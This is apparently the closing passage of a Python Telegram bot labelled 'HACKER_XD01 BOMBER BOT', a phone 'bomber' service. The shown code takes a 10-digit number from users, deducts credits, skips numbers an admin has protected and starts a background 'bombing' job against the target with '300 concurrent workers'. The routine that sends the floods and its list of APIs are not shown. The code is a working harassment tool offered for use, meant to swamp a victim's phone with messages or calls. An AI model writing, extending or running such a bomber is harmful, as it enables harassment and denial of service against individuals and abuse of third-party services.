    phone = m.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        bot.send_message(m.chat.id, "❌ INVALID! Need 10 digits only\nExample: `9876543210`", parse_mode="Markdown")
        return
    user_id = m.chat.id
    if is_protected(phone):
        bot.send_message(user_id, "⚠️ **This number is PROTECTED by admin.**\nBombing not allowed!", parse_mode="Markdown")
        return
    user = get_user(user_id)
    if user["credits"] < 10 and user_id not in ADMIN_IDS:
        bot.send_message(user_id, "❌ INSUFFICIENT CREDITS! You need at least 10 credits.\nGet daily bonus from main menu.", parse_mode="Markdown")
        return
    def run_async():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bomber(user_id, phone))
        loop.close()
    threading.Thread(target=run_async, daemon=True).start()
    bot.send_message(user_id, f"🎯 **BOMBING INITIATED**\n\n📱 TARGET: `{phone}`\n💳 CREDITS DEDUCTED: 10\n⚡ Speed: ULTRA-FAST (300 concurrent workers)", parse_mode="Markdown")

# ================= RUN BOT =================
if __name__ == "__main__":
    print("=" * 40)
    print("🔥 HACKER_XD01 BOMBER BOT ACTIVE (v5.0) 🔥")
    print("=" * 40)
    print(f"👑 ADMIN IDs: {ADMIN_IDS}")
    print(f"📁 DATA: {DATA_FILE}")
    print(f"🎯 APIS: {len(APIS)}")
    print("=" * 40)
    print("✅ BOT RUNNING...")
    print("=" * 40)
    bot.remove_webhook()
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)